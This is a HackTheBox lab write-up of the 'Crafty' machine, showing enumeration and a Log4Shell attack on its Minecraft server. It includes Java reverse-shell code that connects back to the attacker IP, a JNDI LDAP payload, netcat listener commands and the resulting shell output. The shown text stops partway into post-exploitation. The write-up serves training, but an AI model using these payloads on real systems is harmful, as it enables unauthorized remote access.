<!doctype html><html lang=en><head><title>HTB Crafty WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Crafty' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Crafty WriteUp"><meta name=twitter:description content="HackThebox 'Crafty' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/crafty/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Crafty WriteUp"><meta property="og:description" content="HackThebox 'Crafty' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-15T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-15T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Log4j"><meta property="article:tag" content="Log4shell"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/crafty/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/crafty/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/crafty/>HTB Crafty WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-15T00:00:00Z>15 June, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
10-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/log4j/>Log4j</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/log4shell/>Log4shell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/minecraft/>Minecraft</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/java/>Java</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/jd-gui/>Jd-Gui</a></span></div></div></header><div class=post-content><h1 id=crafty----hackthebox>Crafty &ndash; HackTheBox
<a class=heading-link href=#crafty----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Crafty&rsquo; Avatar" src=/pentesting/images/Crafty_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Crafty</code> is an easy box/machine from <code>HackTheBox</code> platform that teaches how to abuse vulnerable <code>Log4j</code> versions in an old Minecraft server. Checking open TCP ports we note that this server is, in fact, a <code>Minecraft</code> server. Analyzing its version we note that it is running a vulnerable version of <code>Log4J</code>, which allows us to to execute the famous exploit <code>Log4Shell</code> (<a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228 class=external-link target=_blank rel=noopener>CVE-2021-44228</a>) and gain a shell as <code>svc_minecraft</code> user. Once inside the machine, we are able to extract a <code>Java</code> <code>.tar</code> file that has credentials. Using <code>RunasCs</code>, we check if those credentials belong to <code>Administrator</code> password; and they do, so we are able to gain access as <code>Administrator</code> user and fully compromise the machine</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan shows only 2 ports open: <code>80</code> <code>HTTP</code> and <code>25565</code> a <code>Minecraft</code> service</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p80,25565 10.10.11.249 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 17:20 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.249
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.17s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE   VERSION
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http      Microsoft IIS httpd 10.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://crafty.htb
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-IIS/10.0
</span></span></span><span class=line><span class=cl><span class=go>25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
</span></span></span></code></pre></div><p>From the output I can see that the site redirects to <code>crafty.htb</code>. So I add this IP address and domain to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.249 crafty.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Visiting the site <code>http://crafty.htb</code> shows a page based on <code>Minecraft</code> that displays, apparently, the data of the server:</p><p><img alt="Crafty 1" src=/pentesting/images/Crafty_1.png></p><p>The site displays the subdomain <code>play.crafty.htb</code>, so I decide to add this site to my <code>/etc/hosts</code> file as well, so it now looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat /etc/hosts | tail -n 1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.249 crafty.htb play.crafty.htb
</span></span></span></code></pre></div><p>but visiting <code>play.crafty.htb</code> just redirects to <code>crafty.htb</code>. For example, analyzing the site with <code>WhatWeb</code> we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb http://play.crafty.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://play.crafty.htb [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], Microsoft-IIS[10.0], RedirectLocation[http://crafty.htb], Title[Document Moved]
</span></span></span><span class=line><span class=cl><span class=go>http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
</span></span></span></code></pre></div><p>I search for directories with a <code>Brute Force Directory Listing</code> with <code>Gobuster</code>, but got nothing interesting:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://crafty.htb -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://crafty.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/home                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/img                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/img/]
</span></span></span><span class=line><span class=cl><span class=go>/Home                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/css/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 144] [--&gt; http://crafty.htb/js/]
</span></span></span><span class=line><span class=cl><span class=go>/IMG                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/IMG/]
</span></span></span><span class=line><span class=cl><span class=go>/CSS                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/CSS/]
</span></span></span><span class=line><span class=cl><span class=go>/Img                  (Status: 301) [Size: 145] [--&gt; http://crafty.htb/Img/]
</span></span></span><span class=line><span class=cl><span class=go>/JS                   (Status: 301) [Size: 144] [--&gt; http://crafty.htb/JS/]
</span></span></span><span class=line><span class=cl><span class=go>/HOME                 (Status: 200) [Size: 1826]
</span></span></span><span class=line><span class=cl><span class=go>/coming-soon          (Status: 200) [Size: 1206]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 220560 / 220561 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>So at this point I decide to go back to port <code>25565</code> shown by <code>Nmap</code> scan. Googling <code>Minecraft 1.16.5 exploit</code> shows that this version has <code>Log4J</code> vulnerable version to <code>Log4Shell</code>. So, apparently, we need to run commands from <code>Minecraft</code> to our machine to exploit this. For this we have 2 options:</p><ol><li>Download <code>Minecraft</code> launcher for <code>Linux</code> (since my attacker machine is a <code>Linux</code> machine). This might require <code>TLauncher</code> so I prefer to skip this option&mldr;</li><li>Use a <code>Python</code> library called <code>pyCraft</code> (whose repository can be visited <a href=https://github.com/ammaraskar/pyCraft class=external-link target=_blank rel=noopener>here</a>) and attempt to run commands from there</li></ol><p>I will use the second option. First, I clone <code>pyCraft</code> repository:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/ammaraskar/pyCraft.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;pyCraft&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 3182, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (158/158), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (70/70), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 3182 (delta 106), reused 112 (delta 88), pack-reused 3024
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (3182/3182), 775.28 KiB | 2.42 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2222/2222), done.
</span></span></span></code></pre></div><p>Then, create a virtual environment to install all the dependencies for this package. In my case I will create an environment called <code>minecraftENV</code>, and install all the package dependencies on that environment:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cd pyCraft
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ python3 -m venv minecraftENV
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ source minecraftENV/bin/activate
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ pip3 install -r requirements.txt
</span></span></span></code></pre></div><p>Next, to exploit <code>Log4J</code> we will use <a href=https://github.com/kozmer/log4j-shell-poc.git class=external-link target=_blank rel=noopener>this Github repository</a>. Once cloned and installed all the dependencies we still need other files to run it. From <code>log4shell-poc</code> repository, we will need to change <code>poc.py</code>. For this we change the portion of code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Exploit</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>host</span><span class=o>=</span><span class=s>&#34;%s&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>port</span><span class=o>=%</span><span class=n>d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=o>=</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=n>cmd</span><span class=p>).</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>).</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Socket</span><span class=w> </span><span class=n>s</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Socket</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>&lt;</span><span class=n>SNIP</span><span class=o>&gt;</span><span class=w>
</span></span></span></code></pre></div><p>to</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exploit</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Exploit</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>host</span><span class=o>=</span><span class=s>&#34;%s&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>port</span><span class=o>=%</span><span class=n>d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=o>=</span><span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ProcessBuilder</span><span class=p>(</span><span class=n>cmd</span><span class=p>).</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>).</span><span class=na>start</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Socket</span><span class=w> </span><span class=n>s</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>Socket</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=w>
</span></span></span></code></pre></div><p>So we change <code>/bin/sh</code> (to get a shell from a <code>Linux</code> server) to <code>cmd.exe</code> (to get a shell from a <code>Windows</code> server, which is the case of <code>Crafty</code> machine)</p><p>We need a <code>Java</code> file to run this exploit. Usually you would like to try different version until the one that works. In this case we need the version <code>8</code>. So we can download it from <a href=https://repo.huaweicloud.com/java/jdk/8u181-b13/ class=external-link target=_blank rel=noopener>this repository</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-17 18:00:39--  https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>Resolving repo.huaweicloud.com (repo.huaweicloud.com)... 119.8.158.18, 119.8.158.19, 119.8.158.17
</span></span></span><span class=line><span class=cl><span class=go>Connecting to repo.huaweicloud.com (repo.huaweicloud.com)|119.8.158.18|:443... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 185646832 (177M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>jdk-8u181-linux-x64.tar.gz                 100%[=======================================================================================&gt;] 177.05M  55.3MB/s    in 3.3s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-17 18:00:42 (53.9 MB/s) - ‚Äòjdk-8u181-linux-x64.tar.gz‚Äô saved [185646832/185646832]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ tar -xf jdk-8u181-linux-x64.tar.gz
</span></span></span></code></pre></div><p>We also have to rename the extracted file to <code>jdk1.8.0_20</code> since this file is needed by the exploit. So we rename it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ mv jdk1.8.0_181 jdk1.8.0_20
</span></span></span></code></pre></div><p>so the directory <code>log4j-shell-poc</code> now looks like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 181352
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 6 gunzf0x gunzf0x      4096 May 17 18:02 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x      4096 May 17 17:54 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x       177 May 17 17:54 Dockerfile
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 8 gunzf0x gunzf0x      4096 May 17 17:54 .git
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x        23 May 17 17:54 .gitignore
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 7 gunzf0x gunzf0x      4096 Jul  7  2018 jdk1.8.0_20
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 185646832 Jul  8  2018 jdk-8u181-linux-x64.tar.gz
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x      1060 May 17 17:54 LICENSE
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x 1 gunzf0x gunzf0x      4208 May 17 17:58 poc.py
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x      3051 May 17 17:54 README.md
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x        18 May 17 17:54 requirements.txt
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x      4096 May 17 17:54 target
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x      4096 May 17 17:54 vulnerable-application
</span></span></span></code></pre></div><p>Now that we have everything we can start running the exploit. First, start a <code>netcat</code> listener, in my case, on port <code>443</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>Then, run the exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 poc.py --userip 10.10.16.2 --webport 80 --lport 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] CVE: CVE-2021-44228
</span></span></span><span class=line><span class=cl><span class=go>[!] Github repo: https://github.com/kozmer/log4j-shell-poc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>[+] Exploit java class created success
</span></span></span><span class=line><span class=cl><span class=go>[+] Setting up LDAP server
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Send me: ${jndi:ldap://10.10.16.2:1389/a}
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Starting Webserver on port 80 http://0.0.0.0:80
</span></span></span><span class=line><span class=cl><span class=go>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span></span><span class=line><span class=cl><span class=go>Listening on 0.0.0.0:1389
</span></span></span></code></pre></div><p>where <code>10.10.16.2</code> is my attacker IP and <code>443</code> is the port I am listening with <code>netcat</code>. But we are not done yet.</p><p>As the program says, we need to execute <code>${jndi:ldap://10.10.16.2:1389/a}</code> in the victim server to trigger the reverse shell.</p><p>Now, start <code>pyCraft</code>. We can use it in offline mode (so we don&rsquo;t need a <code>Minecraft</code> account):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 start.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Enter your username: gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>Enter your password (leave blank for offline mode):
</span></span></span><span class=line><span class=cl><span class=go>Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249
</span></span></span><span class=line><span class=cl><span class=go>Connecting in offline mode...
</span></span></span><span class=line><span class=cl><span class=go>Connected.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>$</span><span class=o>{</span>jndi:ldap://10.10.16.2:1389/a<span class=o>}</span>
</span></span></code></pre></div><p>where, at the end, I have typed <code>${jndi:ldap://10.10.16.2:1389/a}</code>.</p><p>After doing this we get a shell as <code>svc_minecraft</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.249] 49681
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>c:\users\svc_minecraft\server&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>crafty\svc_minecraft
</span></span></span></code></pre></div><p>where we can see the user flag at <code>C:\Users\svc_minecraft\Desktop</code> directory.</p><hr><h3 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h3><p>After searching for some files in the system I can see a <code>Java</code> file at <code>C:\Users\svc_minecraft\server\plugins</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>c:\Users\svc_minecraft\server\plugins&gt;dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C419-63F6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of c:\Users\svc_minecraft\server\plugins
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10/27/2023  02:48 PM    &lt;DIR&gt;          .
